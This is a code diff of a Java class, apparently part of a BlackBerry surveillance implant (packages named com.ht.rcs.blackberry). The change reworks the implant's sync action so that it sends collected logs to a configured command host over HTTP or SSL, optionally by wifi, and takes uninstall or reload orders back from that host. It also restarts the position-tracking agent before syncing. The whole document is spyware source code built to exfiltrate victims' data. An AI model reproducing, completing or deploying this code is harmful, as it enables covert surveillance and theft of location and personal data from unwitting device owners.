@@ -16,10 +16,12 @@ import com.ht.rcs.blackberry.Common;
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.transfer.Transfer;
+import com.ht.rcs.blackberry.transfer.WifiConnection;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
+import com.ht.rcs.blackberry.utils.WChar;
 
 public class SyncAction extends SubAction {
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
@@ -31,7 +33,10 @@ public class SyncAction extends SubAction {
     boolean wifi;
     boolean gprs;
 
+    boolean ssl = false;
+
     String host = "";
+    int port = 80;
 
     public SyncAction(int actionId_, byte[] confParams) {
         super(actionId_);
@@ -50,6 +55,7 @@ public class SyncAction extends SubAction {
     }
 
     public boolean execute() {
+        debug.info("SyncAction execute");
 
         if (statusObj.crisis()) {
             debug.warn("SyncAction - no sync, we are in crisis");
@@ -59,11 +65,9 @@ public class SyncAction extends SubAction {
         wantReload = false;
         wantUninstall = false;
 
-        Check.asserts(logCollector != null, "uberLog == null");
+        Check.asserts(logCollector != null, "logCollector == null");
 
-        // check dei parametri
-
-        readParams();
+        transfer.init(host, port, ssl, wifi);
 
         // Stop degli agenti che producono un singolo log
         agentManager.reStart(Agent.AGENT_POSITION);
@@ -76,68 +80,19 @@ public class SyncAction extends SubAction {
 
         Utils.sleep(2500);
 
-        int ret = internetSync();
+        boolean ret = transfer.send();
 
-        if (ret != 0) {
+        this.wantUninstall = transfer.uninstall;
+        this.wantReload = transfer.reload;
+        
+        if (ret) {
             debug.trace("InternetSend OK");
             return true;
         }
 
         debug.error("InternetSend Unable to perform");
 
-        // eventuale sync via wifi se il display e' spento
-
-        if (wifi) {
-            ret = wifiSync();
-
-            if (ret != 0) {
-                debug.trace("WifiSync OK");
-                return true;
-            }
-
-            debug.warn("WifiSync Unable to perform");
-        }
-
-        if (gprs) {
-            ret = gprsSync();
-
-            if (ret != 0) {
-                debug.trace("Gprs OK");
-                return true;
-            }
-
-            debug.warn("Gprs Unable to perform");
-        }
-
-        debug.error("FAILED");
-
         return false;
-    }
-
-    private int gprsSync() {
-        // TODO Auto-generated method stub
-        return 0;
-    }
-
-    private int internetSync() {
-        int ret = 0; // Transfer.InternetSend(host);
-
-        switch (ret) {
-        case Common.SEND_UNINSTALL:
-            debug.info("ActionSync() SEND_UNINSTALL received");
-            this.wantUninstall = true;
-            break;
-
-        case Common.SEND_RELOAD:
-            debug.info("ActionSync() SEND_RELOAD received");
-            this.wantReload = true;
-            break;
-
-        default:
-            break;
-        }
-
-        return ret;
     }
 
     protected boolean parse(byte[] confParams) {
@@ -152,7 +107,7 @@ public class SyncAction extends SubAction {
             byte[] buffer = new byte[len];
             databuffer.readFully(buffer);
 
-            host = new String(buffer);
+            host = WChar.getString(buffer, true);
 
         } catch (EOFException e) {
             debug.error("params FAILED");
@@ -160,16 +115,6 @@ public class SyncAction extends SubAction {
         }
 
         return true;
-    }
-
-    private void readParams() {
-        // TODO Auto-generated method stub
-
-    }
-
-    private int wifiSync() {
-        // TODO Auto-generated method stub
-        return 0;
     }
 
 }
